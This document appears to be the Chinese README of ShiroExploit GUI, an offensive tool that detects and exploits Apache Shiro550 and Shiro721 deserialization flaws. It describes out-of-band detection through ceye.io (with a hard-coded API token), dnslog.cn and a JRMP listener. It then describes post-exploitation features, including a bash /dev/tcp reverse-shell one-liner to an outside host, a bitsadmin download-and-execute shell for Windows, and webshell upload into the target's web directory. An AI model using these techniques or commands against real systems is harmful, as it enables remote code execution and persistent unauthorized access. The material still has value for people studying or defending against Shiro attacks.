# ShiroExploit GUI Version
支持对Shiro550（硬编码秘钥）和Shiro721（Padding Oracle）的一键化检测，支持回显

## 使用说明 
### 第一步:按要求输入要检测的目标URL和选择漏洞类型
+ Shiro550无需提供rememberMe Cookie，Shiro721需要提供一个有效的rememberMe Cookie
+ Shiro550无需选择操作系统类型，Shiro721需要选择操作系统类型
+ 可以手工指定特定的 Key 和 Gadget，默认不指定，会遍历所有的 Key 和 Gadget
+ “复杂Http请求”支持直接粘贴数据包
![pic1](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic1.jpg)

### 第二步: 选择攻击方式
![pic2](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic2.png)

#### 选择 ```使用 ceye.io 进行漏洞检测```
+ 可以不进行任何配置，配置文件中已经预置了 CEYE 域名和对应的 Token，当然也可以对其进行修改。
+ 程序会首先使用 ```URLDNS``` 筛选出唯一 Key，然后依次调用各个 Gadget 生成 Payload 
+ 缺点：程序会使用 API：http://api.ceye.io/v1/records?token=a78a1cb49d91fe09e01876078d1868b2&type=dns&filter=[UUID] 查询检测结果，这个 API 有时候会无法正常访问，导致在这种方式下无法找到 Key 或者有效的 Gadget


#### 选择 ```使用 dnslog.cn 进行漏洞检测```
+ 可以不进行任何配置，每次启动时程序会自动从 dnslog.cn 申请一个 DNS Record。
+ 程序会首先使用 ```URLDNS``` 筛选出唯一 Key，然后依次调用各个 Gadget 生成 Payload 
+ 缺点：dnslog.cn 只会记录最近10条 DNS 记录，且少数时候会间隔较久才显示 DNS 查询结果

#### 选择 ```使用 JRMP + dnslog 进行漏洞检测```
+ 需要在 VPS 上通过命令```java -cp ShiroExploit.jar com.shiroexploit.server.BasicHTTPServer [HttpSerivce Port] [JRMPListener Port]```开启OOB Service，并按照要求填入相应IP和端口
+ 如果开启OOB Service时未指定端口号，则HTTPService默认监听 ```8080``` 端口，JRMPListener默认监听 ```8088``` 端口
+ 使用 JRMP 的方式进行漏洞检测，可以显著减小 cookie 大小
+ 程序会首先使用 ```URLDNS``` 筛选出唯一 Key，然后使用 JRMP 协议依次为各个 Gadget 生成 Payload

#### 选择 ```使用回显进行漏洞检测```
+ 针对不出网的情况进行漏洞检测，此时可以检测的 Gadget 类型会少于使用 DNSLog 方式的 Gadget类型
+ 目前主要是通过将命令执行结果写入 web 目录下然后读取的方式实现回显
+ 需要提供一个静态资源 URL，程序会将此静态资源所在的目录当做写入目录

### 第三步：检测漏洞并执行命令
+ 程序在判断目标应用是否存在漏洞时，窗口上部的输入框无法进行输入。当程序检测出目标应用存在漏洞时，输入框可以进行输入并执行命令。
+ ```反弹shell（linux）``` 采用 ```bash -i >& /dev/tcp/1.2.3.4/443 0>&1``` 的方式反弹 shell
+ ```反弹shell（Windows）``` 采用 ```bitsadmin``` 下载指定 URL 的 exe 文件并执行的方式获取 shell
![pic5](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic5.png)

+ ```获取Webshell``` 可以在能够回显的情况下直接在攻击者给出的路径（目录需要真实存在）下写入 webshell，webshell 名称和后缀名由攻击者指定，shell 的内容从 config 目录下的 shell.jsp 中读取
![pic3](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic3.png)

## 备注
在使用漏洞检测主程序或者使用OOBService时，均需要ysoserial.jar的支持，将ysoserial.jar和ShiroExploit.jar放置在同一目录即可。

## 致谢
感谢 [AgeloVito](https://github.com/AgeloVito) ，怕冷的企鹅给予本项目的技术支持
